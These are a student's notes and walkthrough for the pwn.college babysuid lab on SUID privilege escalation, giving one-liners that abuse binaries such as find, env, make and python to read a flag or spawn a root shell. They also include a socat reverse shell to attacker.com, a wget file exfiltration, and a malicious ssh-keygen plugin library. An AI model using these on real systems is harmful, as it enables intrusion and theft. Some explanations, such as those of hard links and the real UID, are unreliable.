---
title: "PwnCollege_Note1"
description: the 1st module of ASU CSE 365, program misuse.
date: 2022-10-29
image: pwncollege.png
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - Pwn.college
    - ForeignCourse

---

# Program Misuse

-----------**ASU CSE 365**: Introduction to Cybersecurity

## Program Interaction:Linux Command Line

①	**Learning the command line**

1. [Bandit](https://overthewire.org/wargames/bandit/)

![](img/pwn_college/lesson/filesystem.png)

②	**env:** Environment variables are a set of Key/Value pairs pased into every process when is is launched.

③	**files:** there're many different types of files.

> `-` is a **regular file**
>
> `d` is a **directory**
>
> `l` is a **symbolic link**(point to another file or directory)
>
> `p` is a **named pipe**(FIFO)
>
> `c` is a **character device file**(backed by a hardware device that receives and produces data stream)
>
> `b` is a **block device file**(backed by a hardware device that stores and loads blocks of data)
>
> `s` is a **unix socket**(essentially a local network connection encapsulated in a file)

④	**Symbolic/soft links** created by `ln -s`(-s stands for symbolic), it likes a pointer

⑤	**Hard links**: it copys the original file. If the original file is deleted, the links won't be deleted, and all the hard links can update the same time.

⑥	**pipes**

```shell
echo echo hi		#echo hi
echo echo hi | bash	#hi
```

⑦	**Input and output redirection**

`<in_file`、`>outfile`、`>>out_file`、`2>error_file`、`2>>error_file`

## Program Misuse:Privilege Escalation

①	**permission model**

Permissions: **r: 4	w: 2	x: 1**

File: first `rwx`: **owner user**	second `rwx`: **owner group**	third `rwx`: **other groups**

default **UID: 1000**, **UID 0** is the Linux administrator user root

②	**Privilege elevation**

run an suid binary such as `sudo`, `su`, `newgrp`(SUID is a bit in the Linux permission model)

**SUID**: execute with the `eUID` of the file owner rather than the parent process.

**SGID**: execute with the `eGID` of the file owner rather than the parent process.

**Sticky**: used for shared directories to limit file removal to file owners.



three different type of user and group IDs

- **Effective(eUID,eGID):** used for most access checks-->root:0
- **Real(UID,GID):** true identity of the process owner, used for signal checks
- **Saved:** used for temporarily dropping privileges

```shell
gcc -w:Does not generate any warning information.
```

```shell
sudo chmod u+s xxx	#SetUID bit, other users can have the file owner permissions
#user:rwx--->rws
sudo chown root.root xxx #it will cancel the 's' user:rws--->rwx
sudo chmod g+s xxx 	#group:rwx--->rws
```

## Program Misuse:Mitigations

**command injection**

**/bin/sh** SUID mitigation：

if `/bin/sh` is run as SUID (eUID==0 but rUID !=0)

it will drop privileges to the rUID(root UID) (eUID=rUID and rUID !=0)

Mitigation: to disable `sh -p`

## babysuid challenge

**init:** we can use the Desktop or the Workspace(then change to the terminal) to operate.

**suid:** Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then **when the user executes the file, the file will be executed as the  file owner**, once the file is executed, the identity switch disappears.    



level 1-6: there're some simple programs that can directly read the flag：**cat, more, less, tail, head, sort**

level 7-9: there're some tools  ----> over-privileged **editors**：**vim, emacs, nano**

> emacs points to emacs-gtk by default, it will try to open if there's a graphical interface. But gtk can't setuid, so we can use the `-nw` to forces the graphics window not to pop up.

![](img/pwn_college/level8/image-20221030103804124.png)

**output**

level 10：**rev**---> Used to output each line of a file in reverse order of characters, that is, the first character is last and the last character is first.

level 11: **od**---> Octal, decimal, hex, ASCII dump

```shell
-b:octal		-x -h:hex
-c:ASCII		-d:Decimal(ten)
```

level 12: **hd**---> hexdump, mainly used to view the **hexadecimal encoding** of **Binary files**.

level 13: **xxd**---> Convert any file to **hexadecimal** or binary(-b) form

level 14: **base32**---> `echo 'some-base32-codings' | base32 -d` can decode the base32 coding

```
'ORUGS4ZANFZSA43PNVSSA5DFPB2CASJAO5QW45BAORXSAZLOMNXWIZIK'
```

level 15: **base64**---> decode form same as the base32

```
'cHduLmNvbGxlZ2V7NGxNTU1ILXJFUTdBZHZvNjVzNDEyV0p5Y1ZNLlFYM1VUTXNVRE40WXpXfQo='
```

level 16: **split**---> split the file to the 'xaa' file default(1000row to split).

```shell
split [-b byte][-C ][-][-l rowcount][the file to split][the prefix of the output_file][-a suffix_len]
```

**different archieve format**

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.

level 17: **gzip**

```shell
gzip -f file_name -t		(-d decompress)
# -f:--force Forcibly compressed files		-t:--test Test whether the compressed file is correct.
```

level 18: **bzip2**

```shell
bzip2 -c file_name | bzip2 -d
#-c:results are sent to standard output.
#-d:perform the decompression
```

level 19: **zip**

```shell
zip flag.zip flag #flag --> flag.zip
cat flag.zip #you can see the flag
```

level 20: **tar**

```shell
tar -cf flag.tar.gz flag  	#(-c:create new backup file -f:specify the backup file)
cat flag.tar.gz
```

level 21: **ar** ---> to create or modify a backup file

```shell
ar rv flag.back flag#-r:The file is inserted into the backup file	v:show the detail information
cat flag.back
```

level 22: **cpio**--->used to backup file

```shell
cpio -o	回车	#-o Create the archive (run in copy-out mode)
flag
ctrl + D得到flag
```

level 23: **genisoimage**---> used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.

the file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.

```shell
genisoimage -sort flag
#-sort:to re-ordering the contents of the ISO
```

**execute other commands**

It can be used to break out from restricted environments by spawning an interactive system shell

level 24: **env**--->show environment variables that already exists in the system and executes instructions in the defined environment

```shell
env /bin/sh -p #getshell
#-p:/bin/sh either became bash or stayed dash which got an additional flag -p mimicking bash's behaviour, bash requires the -p flag to not drop setuid privilege.
```

level 25: **find**--->used to find files in the specified directory

```shell
find . -exec /bin/sh -p \;
```

`exec command in Linux is used to execute a command from the bash itself. This command does not create a new process it just replaces the bash with the command to be executed. If the exec command is successful, it does not return to the calling process.`

level 26: **make**---> compile and install tools, manage project compilation issues

```shell
make -s --eval=$'x:\n\t-'"/bin/sh -p"
#-s:--silent don't echo recipes		--eval=STRING:evaluate STRING as a makefile statement
```

level 27: **nice**

```shell
nice /bin/sh -p
```

> **Usage: nice [OPTION] [COMMAND [ARG]...]**
> Run COMMAND with an adjusted niceness, which affects process scheduling.With no COMMAND, print the current niceness.  Niceness values range from -20 (most favorable to the process) to 19 (least favorable to the process).

level 28: **timeout**---> start COMMAND, and kill it if still running after DURATION.

**Usage: timeout [OPTION] DURATION COMMAND [ARG]**

```shell
timeout 7d /bin/sh -p
```

level 29: **stdbuf**---> modify the buffer mode and size of the standard stream

> `-i, --input=MODE`	adjust standard input stream buffering
>
> `-o, --output=MODE`	adjust standard output stream buffering
>
> `-e, --error=MODE`	adjust standard error stream buffering

- If MODE is `L` the corresponding stream will be line buffered.This option is invalid with standard input.


- If MODE is `0` the corresponding stream will be unbuffered.

```shell
stdbuf -i0 /bin/sh -p
```

level 30: **setarch**--->change reported **architecture** in new program **environment** and set personality flags 

```shell
setarch $(arch) /bin/sh -p #arch can set to the i386
```

level 31: **watch**---> listen by timing the output of other commands to a terminal, repeat the command every 2 seconds

Usage: `watch [options] command`

```shell
watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
#-x, --exec		pass command to exec instead of "sh -c"
#-c, --color	interpret ANSI color and style sequences
```

 `exec 1>&0`：This redirects standard output to standard input, because when a  terminal is opened by default, 0,1 and 2 all point to the same  location, which is the current terminal. So this statement restarts  standard output. At this point, execute the command we can see the output

`reset`：Sets the status of the terminal, we can use it to return the terminal to its original state

`sh [parameter] command`

```shell
-c:command to read from a string
-i:realize interaction scripts
-n:do a syntax check
-x:implement detailed statement of tracking
```

level 32: **socat**

- It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

  ```shell
  socat -u "file:$TheFileToRead_flag" - #can get the flag
  #-u unidirectional mode (left to right)
  ```

- Limited SUID: we can run **socat file:`tty`,raw,echo=0 tcp-listen:12345** on the attacker box to receive the shell

  tty：Teletype, A terminal device consisting of a virtual console, serial port, and pseudo-terminal devices

  ```shell
  RHOST=attacker.com
  RPORT=12345
  socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
  #I didn't succed to get the shell(cry...)
  ```


**require some light programming**

level 33: **whiptail**--->display dialog boxes from shell scripts

```shell
#--textbox <file> <height> <width>
#--scrolltext :force vertical scollbars
whiptail --textbox --scrolltext flag 20 20
```

![](img/pwn_college/level33/image-20221107161717570.png)

level 34: **awk**--->pattern scanning and processing language

Use regular, string matching

```shell
awk '//' flag #read the flag

awk '$2 ~ /x/' file
# $2:the 2nd column
# ~:pattern begins
# /x/:pattern match the 'x'
```

awk shell

```shell
#xx.awk
BEGIN{the statement before execution}
END{the statement that should execute after processing all the rows}
awk -f xx.awk <file>
```

level 35: **sed**-->	stream editor for filtering and transforming text

```shell
#USAGE: sed [OPTION]... {script-only-if-no-other-script} [input-file]...
sed -e '' flag #read the flag
#-e:--expression=script 	add the script to the commands to be executed
```

level 36: **ed**---> text editor

> USAGE:	ed [options] [file]
>
> Start edit by reading in 'file' if given. If 'file' begins with a '!', read output of shell command.

```shell
ed flag
56	#output:this is the length of flag
,p	#input
the content of flag	#output
q	#input
exit from this command
```

`(.,.)p:` Prints the addressed lines. If invoked from a terminal, **ed** pauses at the end of each page until a newline is entered. The current address is set to the last line printed.

`q:` quits ed

**doing tricks with permissions**

level 37: **chown**

```shell
chown hacker:hacker flag
cat flag
```

level 38: **chmod**

```shell
chmod 777 flag
cat flag
```

level 39: **cp**

```shell
cp flag /dev/stdout #can read the flag
#if put the echo of the output to /dev/stdout, it will be sent directly to the standard output(the screen)
echo "xx" | cp /dev/stdin flag #this can write the 'xx' to the flag
```

level 40: **mv**

```shell
mv /usr/bin/cat /usr/bin/mv # overwrite the mv, use the mv actually run the cat
./babysuid_level40 #execute the program
mv flag #get the flag
#the normal way to use the 'mv' is overwrite the /etc/shadow or /etc/passwd or /etc/sudoers
```

**let you program anything**

level 41: **perl**---> extract the language practical statements

> Usage: perl [options] [program file] [para]

```shell
perl -ne print flag	#can read the flag
#-n:resume the "while(<>){..}" with the program circulating
#-e:can make the Perl program run in the terminal
```

level 42: **python**

```shell
python -c print(open("flag").read()) #can read the flag

python
>>import os
>>os.setuid(0)
>>os.system("/bin/sh")	#getshell!!
```

level 43: **ruby**

**Direct use of the command line will have a security warning, so it can only be written script execution file to read the flag.**

```shell
ruby -e 'puts File.read("flag")' #can't read the flag-->ruby: no -e allowed while running setuid (SecurityError)
#use the scripts
touch hack.rb #it have no permission in the / directory
echo 'puts File.read("../../flag")' > hack.rb #'../../' is the critical!
ruby hack.rb #can read the flag
```

level 44: **bash**--->(**Bourne Again Shell**) execute the orders read from standard input or files

```shell
bash -p #get the shell
```

**just straight up weren't designed to let you read files**

level 45: **date**---> Display the current time in the given FORMAT, or set the system date.

```shell
hacker@babysuid_level45:/$ date -f flag
date: invalid date 'pwn.college{the flag}'
#-f, --file=DATEFILE        like --date; once for each line of DATEFILE
```

level 46: **dmesg**-->(display message): Display boot information / Display or control the kernel ring buffer. The kernel stores boot information in the **ring buffer**. If you do not  have time to view the information on boot, you can use `dmesg` to do so.  The boot information is also saved in the `/var/log` directory in a file  called **dmesg**

```shell
dmesg -rF flag #can read the flag
#-r: --raw	print the raw message buffer
#-F: --file <file>	use the file instead of the kernel log buffer
```

level 47: **wc**(Count words)--->Print newline, word, and byte counts for each FILE, and a total line if
more than one FILE is specified.  

```shell
wc --files0-from ./flag
#result:wc: 'pwn.college{the flag}'$'\n': No such file or directory
#--files0-from=F    read input from the files specified by
#                   NUL-terminated names in file F;
```

level 48: **gcc**--->compiler for c & c++

```shell
hacker@babysuid_level48:/$ gcc -x c -E flag
# 1 "flag"
# 1 "<built-in>"
# 1 "<command-line>"
# 31 "<command-line>"
# 1 "/usr/include/stdc-predef.h" 1 3 4
# 32 "<command-line>" 2
# 1 "flag"
pwn.college{the flag}

#-x: -x <language>	Specify the language of the following input files.
#                   Permissible languages include: c c++ assembler none
#                   'none' means revert to the default behavior of
#                   guessing the language based on the file's extension.

#-E: Preprocess only; do not compile, assemble or link.
```

level 49: **as**--->a kind of Compiler set

```shell
as @flag
#result:Assembler messages:
#		Error: can't open pwn.college{the flag} for reading: No such file or directory
#@FILE	read options from FILE
as -f flag
#result:flag: Assembler messages:
#		flag:1: Error: no such instruction: `pwn.college{flag}'
# -f: skip whitespace and comment preprocessing
```

level 50: **wget**---> a tool for downloading files from the specified URL

> **Usage: wget [OPTION]... [URL]...**
>
> The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.

```shell
hacker@babysuid_level50:/$ wget -i flag
--2022-11-10 02:19:47--  http://pwn.college%7flag%7D/
Resolving pwn.college{flag} (pwn.college{flag})... failed: Name or service not known.
wget: unable to resolve host address 'pwn.college{flag}'
#-i,--input-file=FILE		download URLs found in local or external FILE
#use the -i,error output will forcely convert the content all to lowercase
```

```shell
nc -lnvp 8088 #listeng on the port 8088
#-l : Listen mode, for inbound connects
#*-n: Suppress name/port resolutions. If there's no -n, error:'nc: getnameinfo: Temporary failure in name resolution'
#-v : Shows the execution of instructions
#-p : port---Specify local port for remote connects
```

```shell
wget --post-file=/flag http://127.0.0.1:8088 #another terminal get the flag
#--post-file=FILE	use the POST method; send contents of FILE
```

**allowing users to load their own code as plugins into the program is dangerous**

level 51: **ssh-keygen**--->Used to generate an SSH public key for the public and private key file, this level is difficult so I can't understand well about it. Maybe I'll explore that later.

> It loads shared libraries that may be used to run code in the binary execution context.

```shell
ssh-keygen -D ./lib.so #but there's no ./lib.so
#-D pkcs11:Download the public keys provided by the PKCS#11 shared library pkcs11
```

**the replay of the video:**[TheAnswerVideo](https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s)

```shell
hacker@babysuid_level51:/$ ssh-keygen -D flag
#dlopen flag failed: flag: cannot open shared object file: No such file or directory
#cannot read public key from pkcs11
```

```c
//hack.c
int main(int argc,char const *argv[]){
    puts("hello world");
}

int my_function(){
    puts("I am here");
}
//gcc -shared hack.c  --->   a.out
//./a.out ----->Segmentation fault (core dumped)
//file a.out
//a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=d2dbe213d9619e8226e1a4c108b9cde1ed002664, not stripped
```

```shell
gcc hack.c
#./a.out ------>hello world
#file a.out
#a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cbd6236d2d832f1b2673a51f31ad4b2b166f5878, for GNU/Linux 3.2.0, not stripped
```

```shell
hacker@babysuid_level51:~$ ldd /bin/false
        linux-vdso.so.1 (0x00007ffd32359000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9e7fe94000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f9e800a7000)
hacker@babysuid_level51:~$ file /lib/x86_64-linux-gnu/libc-2.31.so
/lib/x86_64-linux-gnu/libc-2.31.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1878e6b475720c7c51969e69ab2d276fae6d1dee, for GNU/Linux 3.2.0, stripped
```

```shell
hacker@babysuid_level51:~$ ssh-keygen -D a.out
dlopen a.out failed: a.out: cannot open shared object file: No such file or directory
cannot read public key from pkcs11
hacker@babysuid_level51:~$ ssh-keygen -D ./a.out
dlsym(C_GetFunctionList) failed: ./a.out: undefined symbol: C_GetFunctionList
cannot read public key from pkcs11
```

```c
//hack.c
int main(int argc,char const *argv[]){
    puts("hello world");
}

int C_GetFunctionList(){
    puts("I am here");
}
```

```shell
hacker@babysuid_level51:~$ ssh-keygen -D ./a.out
I am here
C_GetFunctionList for provider ./a.out failed: 10
cannot read public key from pkcs11
```

```c
//hack.c
int main(int argc,char const *argv[]){
    puts("hello world");
}
// or static void inject() __attribute__((constructor));
//void inject(){}
int C_GetFunctionList(){
    sendfile(1,open("../../flag",0),0,4096);
}
```

```shell
gcc -shared hack.c 
ssh-keygen -D ./a.out #get the flag
```

**Dynamic Link Library**(.dll & .so)

The library file is made into a compiled program, giving them an interface for exchanging data, and when writing a program, once a function of a library file is used, the system calls the library file into memory. When the required functionality is complete, the DLL stops running and the entire call process ends.

**Static library**(.a & .lib)

for convenience, put the general-purpose program together, this is the library. Computer has to include all the programs in the link library, making the program big.

**used to find the suid file**

```shell
find / -type f -perm -04000 -ls 2>/dev/null
#-type f: file type
#-perm: permission 4000:root
#2>/dev/null:output the error to the "blackhole/bin"
```

gcc can create shared libraries with the `-shared` parameter. dll can't bu run alone, but rather a program that must be called by someone else. the difference between it and ordinary binaries is that it can be seen with the `file` command.

```shell
gcc x.c -shared -o x.so
```

